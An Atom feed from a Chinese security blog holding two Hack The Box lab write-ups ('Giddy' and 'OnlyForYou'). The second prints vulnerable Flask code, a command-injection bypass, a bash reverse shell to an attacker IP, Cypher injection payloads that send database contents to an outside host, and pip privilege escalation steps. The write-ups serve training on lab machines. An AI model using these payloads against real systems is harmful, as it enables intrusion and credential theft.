<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Syst1m‘s blog</title>
  
  <subtitle>网络安全博客</subtitle>
  <link href="https://syst1m.top/atom.xml" rel="self"/>
  
  <link href="https://syst1m.top/"/>
  <updated>2023-10-17T07:39:26.995Z</updated>
  <id>https://syst1m.top/</id>
  
  <author>
    <name>Syst1m</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>htb-Giddy打靶</title>
    <link href="https://syst1m.top/2023/10/17/htb-Giddy%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2023/10/17/htb-Giddy%E6%89%93%E9%9D%B6/</id>
    <published>2023-10-17T06:45:13.000Z</published>
    <updated>2023-10-17T07:39:26.995Z</updated>
    
    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>开放端口 80 443 3389</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310171452578.png" alt="image-20231017145258534"></p><p>80端口</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310171453445.png" alt="image-20231017145358419"></p><p>443端口,也是一样</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310171454026.png" alt="image-20231017145426980"></p><p>扫下目录,建议用gobuster,这个巨快</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310171519721.png" alt="image-20231017151912681"></p><p>访问一下</p><p>像是远程登录</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310171519168.png" alt="image-20231017151959132"></p><p>出现一个新站</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310171519417.png" alt="image-20231017151943386"></p><p>随便点一个,有id加单引号,报错了,那应该就是这里是入口了</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310171521123.png" alt="image-20231017152110082"></p><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>丢进sqlmap,跑出注入,不是dba</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310171524465.png" alt="image-20231017152405433"></p><p>跑出库</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;开放端口 80 443 3389&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubuserconten</summary>
      
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="hackthebox" scheme="https://syst1m.top/tags/hackthebox/"/>
    
  </entry>
  
  <entry>
    <title>htb-onlyforyou打靶</title>
    <link href="https://syst1m.top/2023/10/11/htb-onlyforyou%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2023/10/11/htb-onlyforyou%E6%89%93%E9%9D%B6/</id>
    <published>2023-10-11T12:20:10.000Z</published>
    <updated>2023-10-17T06:45:38.515Z</updated>
    
    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>nmap先扫下端口</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310112032084.png" alt="image-20231011203203052"></p><p>开放22,80,先看80端口有什么东西</p><p>自动跳转域名了无法访问,加个hosts解析成功访问</p><p>访问慢的可以连一下物理机的代理,在vpn文件里添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">socks-proxy-retry</span><br><span class="line">socks-proxy 192.168.1.1 7890</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310112033398.png" alt="image-20231011203324373"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310112127589.png" alt="image-20231011212745554"></p><p>没找到什么cms可用信息</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310112128706.png" alt="image-20231011212832673"></p><p>翻到一个链接,同样添加hosts在访问</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310112140414.png" alt="image-20231011214011368"></p><p>可以直接下载源码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310112141682.png" alt="image-20231011214129643"></p><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="任意文件下载"><a href="#任意文件下载" class="headerlink" title="任意文件下载"></a>任意文件下载</h2><p>定位到关键路由download</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310112145276.png" alt="image-20231011214539237"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    image = request.form[<span class="string">&#x27;image&#x27;</span>]</span><br><span class="line">    filename = posixpath.normpath(image) </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">or</span> filename.startswith(<span class="string">&#x27;../&#x27;</span>):</span><br><span class="line">        flash(<span class="string">&#x27;Hacking detected!&#x27;</span>, <span class="string">&#x27;danger&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/list&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isabs(filename):</span><br><span class="line">        filename = os.path.join(app.config[<span class="string">&#x27;LIST_FOLDER&#x27;</span>], filename)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(filename):</span><br><span class="line">            flash(<span class="string">&#x27;Image doesn\&#x27;t exist!&#x27;</span>, <span class="string">&#x27;danger&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&#x27;/list&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> (TypeError, ValueError):</span><br><span class="line">        <span class="keyword">raise</span> BadRequest()</span><br><span class="line">    <span class="keyword">return</span> send_file(filename, as_attachment=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>可以看到对..&#x2F;做了过滤,直接访问&#x2F;download是不行的,还有两个功能点可以上传</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310112150084.png"></p><p>上传之后会跳转到list</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310112155195.png" alt="image-20231011215547151"></p><p>抓取下载包</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310112215938.png" alt="image-20231011221551898"></p><p>成功绕过,其实&#x2F;etc&#x2F;passwd也行</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310112217597.png" alt="image-20231011221759558"></p><p>下载不了ssh私钥,不然可以免密登录</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310112230809.png" alt="image-20231011223048751"></p><p>读取nginx配置信息</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310122256706.png" alt="image-20231012225618657"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310122256614.png" alt="image-20231012225635570"></p><p>继续读取主机文件,找到绝对路径,两个站点,一个是最开始访问的only4you.htb,另一个是刚刚拿到源码的,beta站</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310122256187.png" alt="image-20231012225642135"></p><p>猜测和beta站目录结构一样,读取下app.py</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310122307577.png" alt="image-20231012230750528"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, flash, redirect</span><br><span class="line"><span class="keyword">from</span> form <span class="keyword">import</span> sendmessage</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = uuid.uuid4().<span class="built_in">hex</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        email = request.form[<span class="string">&#x27;email&#x27;</span>]</span><br><span class="line">        subject = request.form[<span class="string">&#x27;subject&#x27;</span>]</span><br><span class="line">        message = request.form[<span class="string">&#x27;message&#x27;</span>]</span><br><span class="line">        ip = request.remote_addr</span><br><span class="line"></span><br><span class="line">        status = sendmessage(email, subject, message, ip)</span><br><span class="line">        <span class="keyword">if</span> status == <span class="number">0</span>:</span><br><span class="line">            flash(<span class="string">&#x27;Something went wrong!&#x27;</span>, <span class="string">&#x27;danger&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> status == <span class="number">1</span>:</span><br><span class="line">            flash(<span class="string">&#x27;You are not authorized!&#x27;</span>, <span class="string">&#x27;danger&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flash(<span class="string">&#x27;Your message was successfuly sent! We will reply as soon as possible.&#x27;</span>, <span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/#contact&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page_not_found</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;404.html&#x27;</span>), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">500</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">server_errorerror</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;500.html&#x27;</span>), <span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">400</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bad_request</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;400.html&#x27;</span>), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">405</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">method_not_allowed</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;405.html&#x27;</span>), <span class="number">405</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">80</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h2 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h2><p>复制出来审计,前面都正常flask,发现有个from form,这是beta站没有的</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310122307010.png" alt="image-20231012230758964"></p><p>继续读取这个form.py</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310122257405.png" alt="image-20231012225704368"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> smtplib, re</span><br><span class="line"><span class="keyword">from</span> email.message <span class="keyword">import</span> EmailMessage</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> PIPE, run</span><br><span class="line"><span class="keyword">import</span> ipaddress</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">issecure</span>(<span class="params">email, ip</span>):</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> re.match(<span class="string">&quot;([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]&#123;2,&#125;)&quot;</span>, email):</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">domain = email.split(<span class="string">&quot;@&quot;</span>, <span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line">result = run([<span class="string">f&quot;dig txt <span class="subst">&#123;domain&#125;</span>&quot;</span>], shell=<span class="literal">True</span>, stdout=PIPE)</span><br><span class="line">output = result.stdout.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;v=spf1&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> output:</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">domains = []</span><br><span class="line">ips = []</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;include:&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">dms = <span class="string">&#x27;&#x27;</span>.join(re.findall(<span class="string">r&quot;include:.*\.[A-Z|a-z]&#123;2,&#125;&quot;</span>, output)).split(<span class="string">&quot;include:&quot;</span>)</span><br><span class="line">dms.pop(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> domain <span class="keyword">in</span> dms:</span><br><span class="line">domains.append(domain)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">for</span> domain <span class="keyword">in</span> domains:</span><br><span class="line">result = run([<span class="string">f&quot;dig txt <span class="subst">&#123;domain&#125;</span>&quot;</span>], shell=<span class="literal">True</span>, stdout=PIPE)</span><br><span class="line">output = result.stdout.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;include:&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">dms = <span class="string">&#x27;&#x27;</span>.join(re.findall(<span class="string">r&quot;include:.*\.[A-Z|a-z]&#123;2,&#125;&quot;</span>, output)).split(<span class="string">&quot;include:&quot;</span>)</span><br><span class="line">domains.clear()</span><br><span class="line"><span class="keyword">for</span> domain <span class="keyword">in</span> dms:</span><br><span class="line">domains.append(domain)</span><br><span class="line"><span class="keyword">elif</span> <span class="string">&quot;ip4:&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">ipaddresses = <span class="string">&#x27;&#x27;</span>.join(re.findall(<span class="string">r&quot;ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]&#123;2&#125;&quot;</span>, output)).split(<span class="string">&quot;ip4:&quot;</span>)</span><br><span class="line">ipaddresses.pop(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ipaddresses:</span><br><span class="line">ips.append(i)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">elif</span> <span class="string">&quot;ip4&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">ipaddresses = <span class="string">&#x27;&#x27;</span>.join(re.findall(<span class="string">r&quot;ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]&#123;2&#125;&quot;</span>, output)).split(<span class="string">&quot;ip4:&quot;</span>)</span><br><span class="line">ipaddresses.pop(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ipaddresses:</span><br><span class="line">ips.append(i)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ips:</span><br><span class="line"><span class="keyword">if</span> ip == i:</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span></span><br><span class="line"><span class="keyword">elif</span> ipaddress.ip_address(ip) <span class="keyword">in</span> ipaddress.ip_network(i):</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendmessage</span>(<span class="params">email, subject, message, ip</span>):</span><br><span class="line">status = issecure(email, ip)</span><br><span class="line"><span class="keyword">if</span> status == <span class="number">2</span>:</span><br><span class="line">msg = EmailMessage()</span><br><span class="line">msg[<span class="string">&#x27;From&#x27;</span>] = <span class="string">f&#x27;<span class="subst">&#123;email&#125;</span>&#x27;</span></span><br><span class="line">msg[<span class="string">&#x27;To&#x27;</span>] = <span class="string">&#x27;info@only4you.htb&#x27;</span></span><br><span class="line">msg[<span class="string">&#x27;Subject&#x27;</span>] = <span class="string">f&#x27;<span class="subst">&#123;subject&#125;</span>&#x27;</span></span><br><span class="line">msg[<span class="string">&#x27;Message&#x27;</span>] = <span class="string">f&#x27;<span class="subst">&#123;message&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">smtp = smtplib.SMTP(host=<span class="string">&#x27;localhost&#x27;</span>, port=<span class="number">25</span>)</span><br><span class="line">smtp.send_message(msg)</span><br><span class="line">smtp.quit()</span><br><span class="line"><span class="keyword">return</span> status</span><br><span class="line"><span class="keyword">elif</span> status == <span class="number">1</span>:</span><br><span class="line"><span class="keyword">return</span> status</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> status</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>来到这一行,这里的run是subprocess模块的</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310122257228.png" alt="image-20231012225720186"></p><p>看不明白用chatgpt解释一下,比自己找文档要来的快</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310122258024.png" alt="image-20231012225726656"></p><p>那么只要domain是可控的,我们就可以执行命令,跟进domain这个变量</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310122257618.png" alt="image-20231012225732568"></p><p>继续跟进这个函数,在这里被调用</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310122258530.png" alt="image-20231012225836493"></p><p>继续跟进sendmessage函数,在app.py中被调用</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310122257904.png" alt="image-20231012225740872"></p><p>看到路由为&#x2F;,那么应该就是首页这里提交的数据了</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310122257257.png" alt="image-20231012225749223"></p><p>抓包,慢慢fuzz</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310122257783.png" alt="image-20231012225755743"></p><p>这里要绕过正则才行,也就是必须要是email格式,从@开始切割,取第二个值,用;后面跟命令就行</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310122258182.png" alt="image-20231012225803137"></p><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>这里是没有回显的,本地起个http查看是否执行成功</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310122258991.png" alt="image-20231012225857951"></p><p>成功执行</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310122302806.png" alt="image-20231012230223767"></p><p>反弹一个shell回来</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310122302462.png" alt="image-20231012230256418"></p><p>shell.txt内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.16.3/9001 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>打到这里机器重启了,所以后文ip会变</p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="本地信息收集"><a href="#本地信息收集" class="headerlink" title="本地信息收集"></a>本地信息收集</h2><p>反弹回来的权限很低</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310131602434.png" alt="image-20231013160203388"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310131820052.png" alt="image-20231013182034964"></p><p>发现了几个不对外开放的端口:3306,3000,7474等</p><h2 id="frp内网穿透"><a href="#frp内网穿透" class="headerlink" title="frp内网穿透"></a>frp内网穿透</h2><p>因为这里的几个端口是不对外开放的,所以要将它代理出来</p><p>frps.ini</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310141452574.png" alt="image-20231014145235532"></p><p>frpc.ini,这里server_addr是kali vpn的地址</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310141450053.png" alt="image-20231014145007009"></p><p>用wget从kali上直接下载过去,启动</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310141453527.png" alt="image-20231014145344474"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310141453597.png" alt="image-20231014145330559"></p><p>分别访问</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310141454856.png" alt="image-20231014145436804"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310141456047.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310141455527.png" alt="image-20231014145539471"></p><h2 id="neo4j注入"><a href="#neo4j注入" class="headerlink" title="neo4j注入"></a>neo4j注入</h2><p>总结当前信息:3000端口为Gogs 7474端口是neo4j 8001端口 admin&#x2F;admin弱口令可以登录</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310141500974.png" alt="image-20231014150012923"></p><p>通过searchsploit搜索到相关漏洞</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310141505499.png" alt="image-20231014150530444"></p><p>验证发现不是这个,继续往下看到搜索框,尝试注入</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310141515512.png" alt="image-20231014151520440"></p><p>找下neo4j的注入方法：<a href="https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j#common-cypher-injections">https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j#common-cypher-injections</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM &#x27;</span>http:<span class="operator">/</span><span class="operator">/</span><span class="number">10.10</span><span class="number">.16</span><span class="number">.6</span><span class="operator">/</span>?version<span class="operator">=</span><span class="string">&#x27; + version + &#x27;</span><span class="operator">&amp;</span>name<span class="operator">=</span><span class="string">&#x27; + name + &#x27;</span><span class="operator">&amp;</span>edition<span class="operator">=</span><span class="string">&#x27; + edition as l RETURN 0 as _0 // </span></span><br></pre></td></tr></table></figure><p>可以看到成功返回了版本信息</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310141524241.png" alt="image-20231014152436168"></p><p>获取表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM &#x27;</span>http:<span class="operator">/</span><span class="operator">/</span><span class="number">10.10</span><span class="number">.16</span><span class="number">.6</span><span class="operator">/</span>?label<span class="operator">=</span><span class="string">&#x27;+label as l RETURN 0 as _0 //</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310141527210.png" alt="image-20231014152702147"></p><p>获取账号密码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM &#x27;</span>http:<span class="operator">/</span><span class="operator">/</span><span class="number">10.10</span><span class="number">.16</span><span class="number">.6</span><span class="operator">/</span>?<span class="string">&#x27; + p +&#x27;</span><span class="operator">=</span><span class="string">&#x27;+toString(f[p]) as l RETURN 0 as _0 //</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310141528262.png" alt="image-20231014152814197"></p><p>拿到密码</p><p>john</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310141530455.png" alt="image-20231014153005382"></p><p>admin</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310141530237.png" alt="image-20231014153032170"></p><p>碰撞下ssh,john登录成功</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310141533306.png" alt="image-20231014153317237"></p><p>拿到第一个flag</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310141534307.png" alt="image-20231014153432237"></p><h2 id="pip提权"><a href="#pip提权" class="headerlink" title="pip提权"></a>pip提权</h2><p>发现一个sudo权限的命令 pip3</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310141536038.png" alt="image-20231014153621969"></p><p>关于pip提权 <a href="https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/">https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/</a> </p><p>先下载需要的文件 <a href="https://github.com/wunderwuzzi23/this_is_fine_wuzzi.git">https://github.com/wunderwuzzi23/this_is_fine_wuzzi.git</a> </p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310141547682.png" alt="image-20231014154753598"></p><p>修改setup.py</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310141549657.png" alt="image-20231014154938575"></p><p>然后编译</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310141551924.png" alt="image-20231014155108827"></p><p>编译完成后dict目录会有一个压缩包</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310141552137.png" alt="image-20231014155221062"></p><p>现在登录Gogs,也就是我们刚刚从neo4j跑出来的账号 john&#x2F;ThisIs4You</p><p>进入仓库,将私有取消</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310141555636.png" alt="image-20231014155516556"></p><p>然后上传刚刚编译好的压缩包文件</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310141556966.png" alt="image-20231014155642874"></p><p>不知道为什么下载一直报解压错误,猜测可能是我kali是arm架构的,编译的包x64无法使用</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202310141642214.png" alt="image-20231014164235124"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;nmap先扫下端口&lt;/p&gt;
